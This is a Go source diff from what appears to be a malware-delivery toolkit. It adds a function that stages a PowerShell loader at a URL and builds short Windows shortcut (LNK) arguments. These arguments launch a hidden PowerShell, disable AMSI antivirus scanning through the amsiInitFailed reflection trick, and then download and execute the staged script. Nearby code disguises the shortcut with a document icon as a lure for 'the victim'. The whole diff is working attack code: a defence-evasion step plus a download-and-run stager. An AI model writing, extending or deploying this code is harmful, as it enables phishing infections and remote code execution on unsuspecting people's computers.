@@ -74,6 +74,40 @@ func lnkLinkInfo(targetPath string) []byte {
 	return info
 }
 
+// StageLNKLoader stages the full PS1 script as a file and returns short LNK
+// arguments (~250 chars) that bypass AMSI inline then IEX the staged script.
+// Windows silently truncates LNK Arguments at ~4096 chars, so -EncodedCommand
+// with the full PS loader (6000+ chars) never executes on the victim.
+func StageLNKLoader(ps, stageBase, deliveryDir string) (psArgs, ps1URL string, err error) {
+	if err = os.MkdirAll(deliveryDir, 0755); err != nil {
+		return
+	}
+	f, err := os.CreateTemp(deliveryDir, "stage_*.ps1")
+	if err != nil {
+		return
+	}
+	if _, err = f.WriteString(ps); err != nil {
+		f.Close()
+		return
+	}
+	f.Close()
+	token, err := RegisterStage(f.Name(), "text/plain; charset=utf-8", 0)
+	if err != nil {
+		return
+	}
+	ps1URL = stageBase + "/stage/" + token
+	SetStageURL(token, ps1URL)
+	// Inline AMSI bypass (amsiInitFailed field) + download-and-execute stub.
+	// Must stay well under 4096 chars — this is ~260 chars.
+	psArgs = fmt.Sprintf(
+		`-WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -c `+
+			`"$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');`+
+			`if($a){$f=$a.GetField('amsiInitFailed','NonPublic,Static');if($f){$f.SetValue($null,$true)}};`+
+			`IEX((New-Object Net.WebClient).DownloadString('%s'))"`,
+		ps1URL)
+	return
+}
+
 // BuildLNK writes a Windows shortcut that silently launches powershell.exe with psArgs.
 // The LNK uses a document icon from shell32.dll to appear as a legitimate file.
 func BuildLNK(psArgs, outDir string, lureName ...string) (string, error) {
